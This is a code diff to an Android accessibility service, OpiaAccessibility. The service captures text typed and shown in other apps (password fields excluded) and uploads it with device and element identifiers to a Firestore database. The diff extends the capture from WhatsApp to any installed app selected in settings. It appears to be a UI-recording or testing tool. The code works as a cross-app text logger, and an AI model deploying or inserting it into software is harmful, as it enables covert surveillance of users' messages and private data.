@@ -4,6 +4,9 @@ import android.accessibilityservice.AccessibilityService;
 import android.accessibilityservice.AccessibilityServiceInfo;
 import android.app.Service;
 import android.content.Intent;
+import android.content.SharedPreferences;
+import android.content.pm.ApplicationInfo;
+import android.content.pm.PackageManager;
 import android.os.IBinder;
 import android.support.annotation.NonNull;
 import android.util.Log;
@@ -14,7 +17,9 @@ import com.google.android.gms.tasks.OnFailureListener;
 import com.google.android.gms.tasks.OnSuccessListener;
 import com.google.firebase.firestore.FirebaseFirestore;
 
+import java.util.ArrayList;
 import java.util.HashMap;
+import java.util.List;
 import java.util.Map;
 import java.util.UUID;
 
@@ -31,11 +36,11 @@ public class OpiaAccessibility extends AccessibilityService {
     @Override
     protected void onServiceConnected() {
         Log.d("ACCESSIBILITY", "ON SERVICE");
+
         AccessibilityServiceInfo info = new AccessibilityServiceInfo();
-        info.packageNames = new String[]
-                {
-                        "com.whatsapp"
-                };
+        
+        info.packageNames = addPackages();
+
         info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED |
                 AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED;
 
@@ -51,54 +56,59 @@ public class OpiaAccessibility extends AccessibilityService {
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
 
-        Log.d("ON EVENT", String.valueOf(event.getEventType()));
-        String timestampEvent = String.valueOf(System.currentTimeMillis());
+        SharedPreferences preferences = getSharedPreferences(MainActivity.APP, MODE_PRIVATE);
+        String packageSelected = preferences.getString(MainActivity.PACKAGE, "com.whatsapp");
 
-        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
+        if (String.valueOf(event.getPackageName()).equals(packageSelected)){
 
-            String text = "";
-            if (!event.getSource().isPassword()) {
-                text = event.getSource().getText().toString();
-            }
+            Log.d("ON EVENT", String.valueOf(event.getEventType()));
+            String timestampEvent = String.valueOf(System.currentTimeMillis());
 
-            String elementId = event.getSource().getViewIdResourceName();
-            String className = String.valueOf(event.getSource().getClassName());
+            if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
 
-            Log.d("TEXT_CHANGED", text);
-
-            Map<String, String> newEvent = new HashMap<>();
-            newEvent.put("device", device);
-            newEvent.put("executionTime", executionTime);
-            newEvent.put("eventType", "text");
-            newEvent.put("elementId", elementId);
-            newEvent.put("text", text);
-            newEvent.put("className", className);
-
-            // Add a new document with timestamp as id
-            db.collection(events).document(timestampEvent).set(newEvent).addOnSuccessListener(new OnSuccessListener<Void>() {
-                @Override
-                public void onSuccess(Void aVoid) {
-                    Log.d("ON SUCCESS", "DocumentSnapshot added with ID: " + aVoid);
+                String text = "";
+                if (!event.getSource().isPassword()) {
+                    text = event.getSource().getText().toString();
                 }
-            })
-                    .addOnFailureListener(new OnFailureListener() {
-                        @Override
-                        public void onFailure(@NonNull Exception e) {
-                            Log.w("ON FAILURE", "Error adding document", e);
-                        }
-                    });
-        }
-        else if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED){
 
-            AccessibilityNodeInfo source = event.getSource();
-            if (source == null) {
-                return;
+                String elementId = event.getSource().getViewIdResourceName();
+                String className = String.valueOf(event.getSource().getClassName());
+
+                Log.d("TEXT_CHANGED", text);
+
+                Map<String, String> newEvent = new HashMap<>();
+                newEvent.put("device", device);
+                newEvent.put("executionTime", executionTime);
+                newEvent.put("eventType", "text");
+                newEvent.put("elementId", elementId);
+                newEvent.put("text", text);
+                newEvent.put("className", className);
+
+                // Add a new document with timestamp as id
+                db.collection(events).document(timestampEvent).set(newEvent).addOnSuccessListener(new OnSuccessListener<Void>() {
+                    @Override
+                    public void onSuccess(Void aVoid) {
+                        Log.d("ON SUCCESS", "DocumentSnapshot added with ID: " + aVoid);
+                    }
+                })
+                        .addOnFailureListener(new OnFailureListener() {
+                            @Override
+                            public void onFailure(@NonNull Exception e) {
+                                Log.w("ON FAILURE", "Error adding document", e);
+                            }
+                        });
             }
+            else if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED){
 
-            printAllText(source, timestampEvent);
+                AccessibilityNodeInfo source = event.getSource();
+                if (source == null) {
+                    return;
+                }
 
+                printAllText(source, timestampEvent);
+
+            }
         }
-
     }
 
     private void printAllText(AccessibilityNodeInfo source, String timestampWindow) {
@@ -149,6 +159,23 @@ public class OpiaAccessibility extends AccessibilityService {
                 child.recycle();
             }
         }
+    }
+
+    public String[] addPackages(){
+
+        final PackageManager pm = getPackageManager();
+
+        List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
+        String[] apps = new String[packages.size()];
+
+        for(int i = 0; i < packages.size(); i++){
+            ApplicationInfo packageInfo = packages.get(i);
+            Intent launchActivity = pm.getLaunchIntentForPackage(packageInfo.packageName);
+            if (!packageInfo.packageName.startsWith("com.android") && launchActivity != null){
+                apps[i] = packageInfo.packageName;
+            }
+        }
+        return apps;
     }
 
     @Override
